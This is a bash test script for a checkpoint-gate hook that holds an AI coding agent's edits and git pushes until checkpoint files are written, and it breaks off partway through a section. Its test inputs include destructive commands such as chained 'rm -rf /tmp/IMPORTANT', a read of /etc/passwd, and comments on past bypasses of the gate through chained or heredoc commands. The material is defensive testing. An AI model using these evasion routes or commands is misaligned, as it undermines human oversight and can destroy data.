#!/usr/bin/env bash
# test-checkpoint-gate.sh — Tests for hooks/checkpoint-gate.sh (Phase 3b)
#
# Per Codex review: runs the REPO source against a temp cwd + HOME, not an
# installed copy. PRs verify the actual checked-in hook content.
#
# Usage: bash tests/test-checkpoint-gate.sh

set -uo pipefail

REPO_ROOT="$(cd "$(dirname "$0")/.." && pwd)"
HOOK="$REPO_ROOT/plugins/claude-code/hooks/checkpoint-gate.sh"

if [ ! -x "$HOOK" ]; then
  echo "FAIL: $HOOK is not executable"
  exit 1
fi

TEST_DIR=$(mktemp -d)
TEST_HOME=$(mktemp -d)
# macOS /var → /private/var symlink: classifier resolves with cd -P, so the
# test must use the resolved path for marker-target equality checks.
TEST_DIR="$(cd -P "$TEST_DIR" && pwd)"
TEST_HOME="$(cd -P "$TEST_HOME" && pwd)"
# Session 1 (#86 PR-B): checkpoint-gate sources hooks/lib/command-classifier.sh
# and resolves repo-root via git-common-dir. Initialize TEST_DIR as a git repo.
git -C "$TEST_DIR" init -q 2>/dev/null
# 2026-05-09 .checkpoints/ migration: hook now writes/arms at PRIMARY
# (.checkpoints/) and reads at PRIMARY-then-LEGACY. Tests target the
# primary path for write-side assertions and arming-state setup. Legacy
# paths are still exercised by tests/test-checkpoints-migration.mjs.
MARKER_DIR="$TEST_DIR/.checkpoints"
LEGACY_MARKER_DIR="$TEST_DIR/.claude"
PRE_REQ="$MARKER_DIR/.checkpoint-required"
PRE_DONE="$MARKER_DIR/.pre-checkpoint-done"
POST_REQ="$MARKER_DIR/.post-checkpoint-required"
POST_DONE="$MARKER_DIR/.post-checkpoint-done"

passed=0
failed=0

cleanup() { rm -rf "$TEST_DIR" "$TEST_HOME"; }
trap cleanup EXIT

reset_state() {
  rm -rf "$MARKER_DIR" "$LEGACY_MARKER_DIR"
  mkdir -p "$MARKER_DIR"
}

# planapproval redesign: arming .checkpoint-required is now ANCHORED to an
# approved-plan token (`.plan-approved.<sid>`), NOT a file-write heuristic.
# Implementation-boundary tests (arm + pre-checkpoint block) must seed the
# approval token for their session first. seed_approval <marker_dir> <sid>.
# (Mirrors `plan-marker.mjs --approve`'s token write.)
seed_approval() {
  mkdir -p "$1"
  : > "$1/.plan-approved.$2"
}

mock_json() {
  local tool_name="$1"
  local command="${2:-}"
  if [ -n "$command" ]; then
    jq -n --arg tn "$tool_name" --arg cmd "$command" --arg cwd "$TEST_DIR" \
      '{tool_name: $tn, tool_input: {command: $cmd}, cwd: $cwd}'
  else
    jq -n --arg tn "$tool_name" --arg cwd "$TEST_DIR" \
      '{tool_name: $tn, tool_input: {}, cwd: $cwd}'
  fi
}

run_hook() {
  # ANTHROPIC_API_KEY cleared (E2): the pre-hold consult's LLM stage must
  # never make live API calls from the test suite on a dev machine with a key
  # in the environment — without a key it skips fast and the gate holds, which
  # is exactly the pre-E2 behavior these tests assert.
  HOME="$TEST_HOME" ANTHROPIC_API_KEY="" bash "$HOOK"
}

assert_allowed() {
  local test_name="$1"
  local json="$2"
  local output
  local exit_code=0
  output=$(echo "$json" | run_hook 2>/dev/null) || exit_code=$?
  if [ $exit_code -eq 0 ] && [ -z "$output" ]; then
    echo "  ✓ $test_name"
    ((passed++))
  else
    echo "  ✗ $test_name (exit=$exit_code, output=$output)"
    ((failed++))
  fi
}

assert_blocked() {
  local test_name="$1"
  local json="$2"
  local expected_substring="${3:-}"
  local output
  local exit_code=0
  output=$(echo "$json" | run_hook 2>/dev/null) || exit_code=$?
  if echo "$output" | grep -q '"decision".*"block"'; then
    if [ -n "$expected_substring" ] && ! echo "$output" | grep -q "$expected_substring"; then
      echo "  ✗ $test_name (blocked but message missing '$expected_substring'): $output"
      ((failed++))
    else
      echo "  ✓ $test_name"
      ((passed++))
    fi
  else
    echo "  ✗ $test_name (expected block, got exit=$exit_code, output=$output)"
    ((failed++))
  fi
}

assert_marker_exists() {
  local test_name="$1"
  local marker="$2"
  if [ -f "$marker" ]; then
    echo "  ✓ $test_name"
    ((passed++))
  else
    echo "  ✗ $test_name (marker missing: $marker)"
    ((failed++))
  fi
}

assert_marker_absent() {
  local test_name="$1"
  local marker="$2"
  if [ ! -e "$marker" ]; then
    echo "  ✓ $test_name"
    ((passed++))
  else
    echo "  ✗ $test_name (marker still exists: $marker)"
    ((failed++))
  fi
}

# ============================================================================
echo ""
echo "--- No markers (idle state) ---"
# ============================================================================
reset_state

assert_allowed "1.  Read allowed in idle" "$(mock_json 'Read')"
# planapproval redesign (2026-05-27): arming is anchored to plan-approval, NOT
# a file-write heuristic. In the idle state (no approved-plan token, nothing
# armed) a bare Edit/Write/MultiEdit is PLANNING — it is allowed and never arms
# (NO CHECKPOINTS DURING PLANNING; no plan ⇒ no implementation gate, per the
# user decision dropping the plan-requirement block). The empty-path branch
# still never arms (REPO_ROOT may be a fallback cwd → arming would leak a marker
# into an unrelated repo; see SA-cwd-strict). The "empty path + sanctioned
# implementation → block" half is covered by tests 11-13 (checkpoint armed) and
# the approval-seeded blocks below.
assert_allowed "2.  Bare Edit allowed in idle (no approval ⇒ planning)" \
  "$(mock_json 'Edit')"
assert_allowed "3.  Bare Write allowed in idle (no approval ⇒ planning)" \
  "$(mock_json 'Write')"
assert_allowed "4.  Bare MultiEdit allowed in idle (no approval ⇒ planning)" \
  "$(mock_json 'MultiEdit')"
assert_marker_absent "4a. Idle bare Edit did NOT arm .checkpoint-required (no leak)" "$PRE_REQ"
# Empty path + approval token present ⇒ sanctioned implementation, can't arm
# safely → block (require pre-checkpoint), still WITHOUT arming (leak-safe).
seed_approval "$MARKER_DIR" "idle-approve-sid"
assert_blocked "4b. Bare Edit + approval token → block (sanctioned impl, empty path)" \
  "$(jq -n --arg cwd "$TEST_DIR" --arg sid 'idle-approve-sid' \
    '{tool_name: "Edit", tool_input: {}, cwd: $cwd, session_id: $sid}')" "Checkpoint required"
assert_marker_absent "4c. Empty-path approval block did NOT arm (defers to pre-done write)" "$PRE_REQ"
reset_state
assert_allowed "5.  Bash read-only allowed in idle" "$(mock_json 'Bash' 'ls')"
# B1 (#351, PR-B2): push self-arms .post-checkpoint-required regardless of
# pre-checkpoint state, so even an idle push blocks until the post-checkpoint is
# written — push is now an INDEPENDENT hard gate (D7 backstop). Was: allowed.
assert_blocked "6.  git push in idle self-arms + blocks (B1 hard gate)" \
  "$(mock_json 'Bash' 'git push origin main')" "Post-implementation checkpoint required"
assert_marker_exists "7.  push self-armed post-required in idle (B1)" "$POST_REQ"

# ============================================================================
echo ""
echo "--- Pre-checkpoint gate (.checkpoint-required present, .pre-checkpoint-done missing) ---"
# ============================================================================
reset_state
touch "$PRE_REQ"

assert_allowed "8.  Read allowed (always)" "$(mock_json 'Read')"
assert_allowed "9.  Glob allowed (always)" "$(mock_json 'Glob')"
assert_allowed "10. Grep allowed (always)" "$(mock_json 'Grep')"
assert_blocked "11. Edit blocked by pre-gate" "$(mock_json 'Edit')" "Checkpoint required"
assert_blocked "12. Write blocked by pre-gate" "$(mock_json 'Write')" "Checkpoint required"
assert_blocked "13. MultiEdit blocked by pre-gate" "$(mock_json 'MultiEdit')" "Checkpoint required"
# PR-B2 (#351, F1 CLOSED): the planning-passive redesign left Bash ungated (the
# F1 residual — a pure-Bash shared_write implementation bypassed the pre-gate).
# PR-B2 closes it: shared_write / unsafe_complex / unknown Bash now ARMS + blocks
# WITH the 3-way deny-hint. nonsrc_write + read_only stay free. The escapable
# redirect (`> /tmp/x`) arms because the classifier carries no target; the agent
# classifies it nonsrc_write once and retries (G1). The read_only/nonsrc/shared
# boundary is exercised in tests/test-command-classifier.sh.
assert_blocked "14. Bash shared_write now arms + blocks (F1 closed)" \
  "$(mock_json 'Bash' 'echo hello > /tmp/somefile')" "Checkpoint required"
assert_allowed "14b. Bash read-only echo allowed (#89)" \
  "$(mock_json 'Bash' 'echo hello')"
# gh pr checkout mutates the working tree (shared_write) → arms + blocks (F1 closed).
assert_blocked "14c. gh pr checkout arms + blocks (F1 closed)" \
  "$(mock_json 'Bash' 'gh pr checkout 113')" "Checkpoint required"
# Negative: read-only PR commands must still pass during pre-gate.
assert_allowed "14d. gh pr view allowed by pre-gate (read_only)" \
  "$(mock_json 'Bash' 'gh pr view 113')"
assert_blocked "15. NotebookEdit blocked by pre-gate" "$(mock_json 'NotebookEdit')" "Checkpoint required"

# Marker-write allowlist (deadlock prevention)
assert_allowed "16. Bash writing pre-checkpoint-done allowed (no deadlock)" \
  "$(mock_json 'Bash' "echo 'checkpoint text' > $PRE_DONE")"
# Session 1 (Codex ...3503 P1): per-marker prerequisites. Writing POST_DONE
# requires .post-checkpoint-required; with only PRE_REQ armed, this blocks.
assert_blocked "17. Bash writing post-checkpoint-done BLOCKED (POST_REQ not armed)" \
  "$(mock_json 'Bash' "echo 'post text' > $POST_DONE")" "Checkpoint required"
assert_allowed "18. Bash heredoc to pre-checkpoint-done allowed" \
  "$(mock_json 'Bash' "$(printf 'cat > %s <<EOF\ncheckpoint\nEOF' "$PRE_DONE")")"

# ============================================================================
echo ""
echo "--- fd-redirect tokenizer (T3 empirical repros) ---"
# ============================================================================
# Bug repro (2026-05-18): with CR armed + pre-done absent, read-only
# commands using the `2>&1` stderr-merge idiom were misclassified as
# `shared_write` and BLOCKED by pre-gate, defeating routine inspection
# during the very state the gate exists to enforce a single checkpoint
# write. Codex R1-R5 chain (ACCEPT-with-FU at R5) drove the
# operand-completeness fix.
reset_state
touch "$PRE_REQ"

# Read-only base commands with fd-dup stderr merge → ALLOW (the bug fix)
assert_allowed "18a. ls 2>&1 allowed during pre-gate" \
  "$(mock_json 'Bash' 'ls -la /tmp 2>&1')"
assert_allowed "18b. ls 2>&1 | head allowed during pre-gate" \
  "$(mock_json 'Bash' 'ls -la /tmp 2>&1 | head -40')"
assert_allowed "18c. em-search 2>&1 piped allowed during pre-gate" \
  "$(mock_json 'Bash' 'node scripts/em-search.mjs --tag x 2>&1 | head')"
assert_allowed "18d. find ... 2>&1 allowed" \
  "$(mock_json 'Bash' 'find .checkpoints -maxdepth 2 -type f 2>&1')"
assert_allowed "18e. echo hi >&2 allowed (fd-dup, not file)" \
  "$(mock_json 'Bash' 'echo hi >&2')"
assert_allowed "18f. >& 2 whitespace-fd-dup allowed" \
  "$(mock_json 'Bash' 'ls >& 2')"
assert_allowed "18g. 2>& 1 whitespace-fd-dup allowed" \
  "$(mock_json 'Bash' 'ls 2>& 1')"
assert_allowed "18h. cat <&5 input-fd-dup allowed" \
  "$(mock_json 'Bash' 'cat <&5')"
assert_allowed "18i. &>>/dev/null allowed" \
  "$(mock_json 'Bash' 'ls &>>/dev/null')"

# PR-B2 (#351, F1 CLOSED): real-file redirects classify as shared_write → now
# ARM + block (were allowed under the F1 residual). The fd-dup vs real-file-
# redirect classifier boundary is owned by FD20-FD24 in
# tests/test-command-classifier.sh; one representative kept here as a gate
# regression guard.
assert_blocked "18j. real file redirect (2>file) arms + blocks (F1 closed)" \
  "$(mock_json 'Bash' 'ls 2>/tmp/err.log')" "Checkpoint required"
# fd-dup followed by push: classifier reduces to push_or_pr_create → B1 push
# self-arm fires: POST_REQ self-armed this invocation → block. (Was allowed —
# push-gate inactive without POST_REQ.)
assert_blocked "18o. fd-dup then push self-arms + blocks (B1)" \
  "$(mock_json 'Bash' 'git status 2>&1 && git push')" "Post-implementation checkpoint required"

# ============================================================================
echo ""
echo "--- Empty pre-checkpoint-done does NOT unblock ---"
# ============================================================================
reset_state
touch "$PRE_REQ"
touch "$PRE_DONE"  # empty file

assert_blocked "19. Empty pre-checkpoint-done still blocks Edit" \
  "$(mock_json 'Edit')" "Checkpoint required"

# ============================================================================
echo ""
echo "--- Non-empty pre-checkpoint-done unblocks ---"
# ============================================================================
reset_state
touch "$PRE_REQ"
echo "## Rule 18 checkpoint" > "$PRE_DONE"

assert_allowed "20. Non-empty pre-checkpoint-done unblocks Edit" "$(mock_json 'Edit')"
assert_marker_exists "21. post-checkpoint-required armed after allowed Edit" "$POST_REQ"

# Idempotent: second write doesn't error
rm -f "$POST_REQ"
assert_allowed "22. Second allowed write also arms post-required" "$(mock_json 'Write')"
assert_marker_exists "23. post-required present after second write" "$POST_REQ"

# ============================================================================
echo ""
echo "--- Push gate (post-required present, post-done missing/empty) ---"
# ============================================================================
reset_state
touch "$PRE_REQ"
echo "pre done" > "$PRE_DONE"
touch "$POST_REQ"

assert_blocked "24. git push blocked by push-gate" \
  "$(mock_json 'Bash' 'git push origin main')" "Post-implementation checkpoint required"
assert_blocked "25. gh pr create blocked by push-gate" \
  "$(mock_json 'Bash' 'gh pr create --title foo --body bar')" "Post-implementation checkpoint required"
assert_blocked "26. git -C path push blocked by push-gate" \
  "$(mock_json 'Bash' 'git -C /tmp/repo push origin main')" "Post-implementation checkpoint required"
assert_blocked "27. cd && git push blocked by push-gate" \
  "$(mock_json 'Bash' 'cd /tmp && git push')" "Post-implementation checkpoint required"
assert_blocked "28. git push -f blocked by push-gate" \
  "$(mock_json 'Bash' 'git push -f origin main')" "Post-implementation checkpoint required"

# Codex PR #113 F2 (`...9796`/`...9cdd`): gh pr lock/unlock are shared
# GitHub mutations (push_or_pr_create) and must be blocked by the push-gate.
assert_blocked "28b. gh pr lock blocked by push-gate (F2 push_or_pr_create)" \
  "$(mock_json 'Bash' 'gh pr lock 113')" "Post-implementation checkpoint required"
assert_blocked "28c. gh pr unlock blocked by push-gate (F2 push_or_pr_create)" \
  "$(mock_json 'Bash' 'gh pr unlock 113')" "Post-implementation checkpoint required"
# Subagent review on commit 8: gh pr update-branch is push_or_pr_create.
assert_blocked "28d. gh pr update-branch blocked by push-gate" \
  "$(mock_json 'Bash' 'gh pr update-branch 113')" "Post-implementation checkpoint required"
# Codex review on commit 8 (`...9fc4`): gh pr revert is push_or_pr_create.
assert_blocked "28e. gh pr revert blocked by push-gate" \
  "$(mock_json 'Bash' 'gh pr revert 113')" "Post-implementation checkpoint required"

# Empty post-done does NOT unblock
touch "$POST_DONE"
assert_blocked "29. Empty post-checkpoint-done still blocks push" \
  "$(mock_json 'Bash' 'git push origin main')" "Post-implementation checkpoint required"

# Non-push commands NOT affected by push-gate
assert_allowed "30. git status NOT blocked by push-gate" "$(mock_json 'Bash' 'git status')"
assert_allowed "31. git pushtags-like word NOT blocked" "$(mock_json 'Bash' 'echo gitpush')"

# Marker-write allowlist still works under push-gate state
assert_allowed "32. Bash writing post-checkpoint-done allowed under push-gate" \
  "$(mock_json 'Bash' "echo 'post text' > $POST_DONE")"

# ============================================================================
echo ""
echo "--- Push allowed sweeps PRE pair, keeps POST pair sticky (delivery) ---"
# ============================================================================
reset_state
touch "$PRE_REQ"
echo "pre done" > "$PRE_DONE"
touch "$POST_REQ"
echo "post done" > "$POST_DONE"

assert_allowed "33. git push allowed when post-done non-empty" \
  "$(mock_json 'Bash' 'git push origin main')"
assert_marker_absent "34. checkpoint-required cleaned after push" "$PRE_REQ"
assert_marker_absent "35. pre-checkpoint-done cleaned after push" "$PRE_DONE"
# Post pair is now own-session-sticky across a delivery's push-class actions
# (git push -> gh pr create -> gh pr review). The prior blanket sweep wiped the
# satisfied post-checkpoint on the first push, forcing a redundant
# post-checkpoint for the 2nd/3rd action of the SAME delivery.
assert_marker_exists "36. post-checkpoint-required KEPT after push (sticky)" "$POST_REQ"
assert_marker_exists "37. post-checkpoint-done KEPT after push (sticky)" "$POST_DONE"

# gh pr create also keeps the POST pair (same delivery) while sweeping PRE.
reset_state
touch "$PRE_REQ"
echo "pre" > "$PRE_DONE"
touch "$POST_REQ"
echo "post" > "$POST_DONE"
assert_allowed "38. gh pr create allowed (PRE swept, POST sticky)" \
  "$(mock_json 'Bash' 'gh pr create --title x --body y')"
assert_marker_absent "38b. gh pr create swept .checkpoint-required (PRE)" "$PRE_REQ"
assert_marker_exists "39. post-checkpoint-required KEPT after gh pr create (sticky)" "$POST_REQ"

# ============================================================================
echo ""
echo "--- Edge: idle state push (B1 — push self-arms a hard gate) ---"
# ============================================================================
reset_state

# B1 (#351): push with no markers self-arms POST_REQ this invocation → blocks
# (was: allowed, no markers created — the pre-B1 push-gate-inactive behavior).
assert_blocked "40. git push with no markers self-arms + blocks (B1)" \
  "$(mock_json 'Bash' 'git push origin main')" "Post-implementation checkpoint required"
assert_marker_exists "41. push in idle self-arms post-required (B1)" "$POST_REQ"

# ============================================================================
echo ""
echo "--- Edge: post-tracking only arms after pre-checkpoint satisfied ---"
# ============================================================================
reset_state
# .checkpoint-required absent — no pre-checkpoint was ever required
echo "stale done" > "$PRE_DONE"  # orphan PRE_DONE without PRE_REQ

assert_allowed "42. Edit allowed when no PRE_REQ" "$(mock_json 'Edit')"
assert_marker_absent "43. post-required NOT armed when PRE_REQ absent" "$POST_REQ"

# ============================================================================
echo ""
echo "--- Edge: missing .claude dir (mkdir -p safety) ---"
# ============================================================================
rm -rf "$MARKER_DIR"
# planapproval redesign: a concrete in-repo Edit arms .checkpoint-required ONLY
# when an approved-plan token exists for the session. Seed the token first (the
# token write itself recreated the missing .checkpoints/ dir). The hook must
# handle arming under a freshly (re)created dir without crashing — assert a
# clean block plus that the arm created the session-namespaced marker.
MD44_SID="44444444-dddd-4ddd-8ddd-444444444444"
seed_approval "$MARKER_DIR" "$MD44_SID"
edit_inrepo_missingdir_json=$(jq -nc --arg fp "$TEST_DIR/src.mjs" --arg cwd "$TEST_DIR" --arg sid "$MD44_SID" \
  '{tool_name: "Edit", tool_input: {file_path: $fp}, cwd: $cwd, session_id: $sid}')
assert_blocked "44. Hook handles (re)created marker dir without crashing (approved arm + block)" \
  "$edit_inrepo_missingdir_json" "Checkpoint required"
assert_marker_exists "44a. approved arm created .checkpoint-required.<sid> under (re)created .checkpoints/" \
  "$MARKER_DIR/.checkpoint-required.$MD44_SID"
assert_marker_absent "44b. arm consumed the approval token (.plan-approved.<sid>)" \
  "$MARKER_DIR/.plan-approved.$MD44_SID"

# ============================================================================
echo ""
echo "--- #65 R1: tightened allowlist — mention without write does NOT bypass ---"
# ============================================================================
reset_state
touch "$PRE_REQ"

# Pathological cases: command mentions marker name but doesn't write to it.
# Pre-tightening these would have bypassed the gate; post-tightening they block.
# #89 (Session 1): read-only commands that merely MENTION marker names
# (without writing to them) are now allowed. The classifier distinguishes
# string-content from actual redirects.
assert_allowed "45. Bash 'cat etc; echo .pre-checkpoint-done' allowed (no write)" \
  "$(mock_json 'Bash' "cat /etc/passwd; echo .pre-checkpoint-done")"
assert_allowed "46. Bash echo of marker name without redirect allowed (#89)" \
  "$(mock_json 'Bash' "echo .post-checkpoint-done")"
# Heredoc body without redirect still blocks (it's a write — `cat <<EOF` writes
# to stdout but classifier sees `cat` as read_only when no redirect target).
# Actually under #89: cat without redirect is read_only. Allow.
assert_allowed "47. Bash 'cat <<EOF' (heredoc as input, no redirect) allowed" \
  "$(mock_json 'Bash' "$(printf 'cat <<EOF\n.pre-checkpoint-done\nEOF')")"

# Legitimate writes still pass the tightened allowlist
assert_allowed "48. Bash '> .pre-checkpoint-done' allowed (redirect)" \
  "$(mock_json 'Bash' "echo content > $PRE_DONE")"
# Session 1 (Codex ...3503 P1): writing POST_DONE without POST_REQ armed blocks.
assert_blocked "49. Bash '>> .post-checkpoint-done' BLOCKED (POST_REQ not armed)" \
  "$(mock_json 'Bash' "echo content >> $POST_DONE")" "Checkpoint required"
assert_blocked "50. Bash 'tee .post-checkpoint-done' BLOCKED (POST_REQ not armed)" \
  "$(mock_json 'Bash' "echo content | tee $POST_DONE")" "Checkpoint required"

# Codex round-1 F1 regression: nested marker-like paths under .checkpoints/
# or .claude/ must NOT pass the marker_write allowlist. Pre-fix the
# allowlist matched any descendant by basename; post-fix it requires an
# EXACT match against the canonical primary or legacy marker path.
#
# Rank-1 plan v7 update: descendants are now blocked by the new wrong-root
# helper (_is_wrong_root_marker_write) with a more specific reason that
# names the canonical path, NOT the generic "Checkpoint required" pre-gate
# reason. Behavior is strictly better (block reason is actionable). Assert
# the new reason substring.
mkdir -p "$MARKER_DIR/sub" "$LEGACY_MARKER_DIR/sub"
assert_blocked "50a. nested .checkpoints/sub/.pre-checkpoint-done — NOT allowed (F1)" \
  "$(mock_json 'Bash' "echo content > $MARKER_DIR/sub/.pre-checkpoint-done")" "non-canonical path"
assert_blocked "50b. nested .claude/sub/.pre-checkpoint-done — NOT allowed (F1)" \
  "$(mock_json 'Bash' "echo content > $LEGACY_MARKER_DIR/sub/.pre-checkpoint-done")" "non-canonical path"
# Edit tool path-equivalent of 50a
edit_nested_json=$(jq -nc --arg fp "$MARKER_DIR/sub/.pre-checkpoint-done" --arg cwd "$TEST_DIR" \
  '{tool_name: "Edit", tool_input: {file_path: $fp}, cwd: $cwd}')
assert_blocked "50c. Edit nested .checkpoints/sub/.pre-checkpoint-done — NOT allowed (F1)" \
  "$edit_nested_json" "non-canonical path"

# ============================================================================
echo ""
echo "--- #66: heredoc-body bypass blocked (pre-<< check) ---"
# ============================================================================
reset_state
touch "$PRE_REQ"

# Command writes to readme.md (shared_write); the heredoc body merely MENTIONS
# `> .pre-checkpoint-done`. The classifier correctly does NOT treat the body as
# a marker write (it stays shared_write, not marker_write). PR-B2 (#351, F1
# closed): a shared_write redirect now ARMS + blocks. The classifier's
# pre-<<-portion-only parsing is owned by test-command-classifier.sh.
heredoc_bypass='cat > readme.md <<EOF
echo > .pre-checkpoint-done
EOF'
assert_blocked "54. Heredoc to readme.md arms + blocks (shared_write; body-mention not a marker write)" \
  "$(mock_json 'Bash' "$heredoc_bypass")" "Checkpoint required"

# Legitimate heredoc TO the marker: redirect target is in pre-<< portion → allow.
heredoc_legit='cat > '"$PRE_DONE"' <<EOF
Rule 18 checkpoint
EOF'
assert_allowed "55. Heredoc TO marker still allowed (redirect in pre-<< portion)" \
  "$(mock_json 'Bash' "$heredoc_legit")"

# Here-string to POST_DONE: per-marker prereq requires POST_REQ which isn't
# set in this test section (only PRE_REQ active) → blocks (Session 1 tightening).
herestring_legit='tee '"$POST_DONE"' <<<"checkpoint text"'
assert_blocked "56. Here-string to POST_DONE BLOCKED (POST_REQ not armed)" \
  "$(mock_json 'Bash' "$herestring_legit")" "Checkpoint required"

# Here-string writes to readme.md (shared_write); body merely mentions the
# marker. PR-B2 (#351, F1 closed): shared_write Bash arms + blocks.
herestring_bypass='cat > readme.md <<<"echo > .pre-checkpoint-done"'
assert_blocked "57. Here-string to readme.md arms + blocks (shared_write, F1 closed)" \
  "$(mock_json 'Bash' "$herestring_bypass")" "Checkpoint required"

# ============================================================================
echo ""
echo "--- #65 R2: push-gate boundary characters — quoted strings do NOT trigger ---"
# ============================================================================
reset_state
touch "$PRE_REQ"
echo "pre done" > "$PRE_DONE"
touch "$POST_REQ"

# The push-gate regex requires a boundary character ([[:space:]&;|()]) before
# `git push` / `gh pr create`. Quote characters are NOT in the boundary set,
# so `echo "git push"` and similar quoted mentions are NOT blocked. This is
# correct behavior — original R2 concern was unfounded; documenting the
# actual semantics with a regression guard.
assert_allowed "51. Bash echo of quoted 'git push' to other file NOT blocked" \
  "$(mock_json 'Bash' 'echo "git push origin main" > /tmp/note')"
assert_allowed "52. Bash printf with quoted 'gh pr create' NOT blocked" \
  "$(mock_json 'Bash' "printf 'gh pr create\\n' > /tmp/note")"

# But unquoted shell-tokenized git push IS blocked (correct)
assert_blocked "53. Bash with unquoted 'git push' (separate token) IS blocked" \
  "$(mock_json 'Bash' "git status && git push origin main")" "Post-implementation checkpoint required"

# ============================================================================
echo ""
echo "--- #68 F1 CLOSED (PR-B2 #351): chained marker-write reduces to shared_write → arms + blocks ---"
# ============================================================================
# PR-B2 (#351): a marker-write CHAINED with another command reduces (most-
# restrictive) to shared_write — and shared_write Bash now ARMS + blocks (F1
# closed). The chain's marker_write segment no longer wins, so the gate's
# marker_write allowlist is bypassed and the Bash arm fires. This is the
# intended closure: a chained shared_write can no longer ride a marker-write
# prefix to escape the pre-checkpoint. The classifier's chain reduction is owned
# by T70-T76 in test-command-classifier.sh.
reset_state
touch "$PRE_REQ"

assert_blocked "64. marker-write THEN ; chained shared_write — arms + blocks (F1 closed)" \
  "$(mock_json 'Bash' "echo content > $PRE_DONE; rm -rf /tmp/IMPORTANT")" "Checkpoint required"
assert_blocked "65. marker-write THEN && chained shared_write — arms + blocks" \
  "$(mock_json 'Bash' "echo content > $PRE_DONE && rm -rf /tmp/IMPORTANT")" "Checkpoint required"
assert_blocked "66. marker-write THEN || chained shared_write — arms + blocks" \
  "$(mock_json 'Bash' "echo content > $PRE_DONE || rm -rf /tmp/IMPORTANT")" "Checkpoint required"
assert_blocked "67. marker-write THEN | piped shared_write — held for classification + blocks" \
  "$(mock_json 'Bash' "echo content > $PRE_DONE | tee /tmp/log")" "Classify it ONCE"
assert_blocked "67b. marker-write THEN newline + ; chained shared_write — arms + blocks (#72)" \
  "$(mock_json 'Bash' "echo content > $PRE_DONE
; rm -rf /tmp/IMPORTANT")" "Checkpoint required"

# Push-gate variant: chained post-marker-write THEN git push must block
echo "pre done" > "$PRE_DONE"
touch "$POST_REQ"
assert_blocked "68. post-marker-write THEN ; git push — blocks (no bypass)" \
  "$(mock_json 'Bash' "echo post > $POST_DONE; git push origin main")" "Post-implementation checkpoint required"

# Legitimate single-statement marker-writes still pass (regression check)
reset_state
touch "$PRE_REQ"
assert_allowed "69. Pure echo > marker still allowed (regression)" \
  "$(mock_json 'Bash' "echo content > $PRE_DONE")"
assert_allowed "70. Pure cat > marker <<EOF still allowed (regression)" \
  "$(mock_json 'Bash' "$(printf 'cat > %s <<EOF\nRule 18\nEOF' "$PRE_DONE")")"
assert_allowed "71. Pure tee marker <<<text still allowed (regression)" \
  "$(mock_json 'Bash' "tee $PRE_DONE <<<\"checkpoint\"")"
# Trailing whitespace after marker should still pass (legitimate noise)
assert_allowed "72. echo > marker followed only by whitespace still allowed" \
  "$(mock_json 'Bash' "echo content > $PRE_DONE   ")"

# ============================================================================
echo ""
echo "--- #69 F2: push regex no longer matches non-push git subcommands ---"
# ============================================================================
# Pre-fix: `git[[:space:]]+([^&;|]*[[:space:]])?push` allowed any tokens
# between `git` and `push`, so `git commit -m push` and `git branch push`
# were false-positive blocked. Post-fix: only -X / --long / -X arg flag
# patterns allowed between git and push.
reset_state
touch "$PRE_REQ"
echo "pre done" > "$PRE_DONE"
touch "$POST_REQ"

# False positives that should now be allowed (no real git push)
assert_allowed "73. 'git commit -m push' NOT blocked (commit message contains 'push')" \
  "$(mock_json 'Bash' "git commit -m push")"
assert_allowed "74. 'git branch push' NOT blocked (branch named push)" \
  "$(mock_json 'Bash' "git branch push")"
assert_allowed "75. 'git stash push' NOT blocked (stash subcommand takes 'push')" \
  "$(mock_json 'Bash' "git stash push")"
assert_allowed "76. 'git tag push' NOT blocked (tag named push)" \
  "$(mock_json 'Bash' "git tag push")"

# Real git push commands STILL blocked (regression check)
assert_blocked "77. 'git push' IS blocked (regression)" \
  "$(mock_json 'Bash' "git push origin main")" "Post-implementation checkpoint required"
assert_blocked "78. 'git -C /path push' IS blocked (global flag with arg)" \
  "$(mock_json 'Bash' "git -C /tmp/repo push")" "Post-implementation checkpoint required"
assert_blocked "79. 'git --no-pager push' IS blocked (long flag)" \
  "$(mock_json 'Bash' "git --no-pager push")" "Post-implementation checkpoint required"
assert_blocked "80. 'gh pr create' IS blocked (regression)" \
  "$(mock_json 'Bash' "gh pr create --title x --body y")" "Post-implementation checkpoint required"

# ============================================================================
echo ""
echo "--- #73: heredoc + post-EOF chain (planning-passive: shared_write chains now allowed) ---"
# ============================================================================
# Pre-fix: cat > marker <<EOF\n...\nEOF\nrm -rf / had pre-<< portion that
# matched allowlist (`cat > marker `), and the post-EOF chained command
# (rm) ran unchecked. Post-fix: scan for non-whitespace content after the
# heredoc terminator line; if found, the allowlist won't match.
reset_state
touch "$PRE_REQ"

# Bypass attempts that should now block
heredoc_chain1="cat > $PRE_DONE <<EOF
rule18
EOF
rm -rf /tmp/IMPORTANT"
assert_blocked "81. heredoc + post-EOF ; chained shared_write — arms + blocks (#73, F1 closed)" \
  "$(mock_json 'Bash' "$heredoc_chain1")" "Checkpoint required"

heredoc_chain2="cat > $PRE_DONE <<EOF
rule18
EOF
&& git push origin main"
# Chained git push → reduces to push_or_pr_create → B1 push self-arm fires
# (POST_REQ self-armed this invocation) → block. (Was: allowed — push-gate
# inactive without POST_REQ.)
assert_blocked "82. heredoc + post-EOF && git push — self-arms + blocks (B1)" \
  "$(mock_json 'Bash' "$heredoc_chain2")" "Post-implementation checkpoint required"

# <<- form (leading tabs allowed on terminator) with post content
# Session 1: classifier distinguishes chained-command intent. A chained
# read_only `echo leak` after a marker write is no longer treated as a
# bypass attempt — read_only chains cannot escalate the marker write to
# something dangerous. Adversarial chains that ARE writes (rm, git push,
# etc.) still escalate to shared_write/push_or_pr_create which block.
# These tests now assert the read-only-chain case allows.
heredoc_dash=$(printf 'cat > %s <<-EOF\n\tcontent\n\tEOF\necho leak' "$PRE_DONE")
assert_allowed "83. <<-EOF + read-only echo chain — allowed (read_only chain)" \
  "$(mock_json 'Bash' "$heredoc_dash")"

# Adversarial dash-EOF with rm chain → shared_write → arms + blocks (F1 closed).
heredoc_dash_evil=$(printf 'cat > %s <<-EOF\n\tcontent\n\tEOF\nrm -rf /tmp/IMPORTANT' "$PRE_DONE")
assert_blocked "83b. <<-EOF + rm chain — arms + blocks (shared_write, F1 closed)" \
  "$(mock_json 'Bash' "$heredoc_dash_evil")" "Checkpoint required"

heredoc_quoted="cat > $PRE_DONE <<'EOF'
literal text
EOF
echo leak"
assert_allowed "84. <<'EOF' + read-only echo chain — allowed (read_only chain)" \
  "$(mock_json 'Bash' "$heredoc_quoted")"

heredoc_quoted_evil="cat > $PRE_DONE <<'EOF'
literal text
EOF
rm -rf /tmp/IMPORTANT"
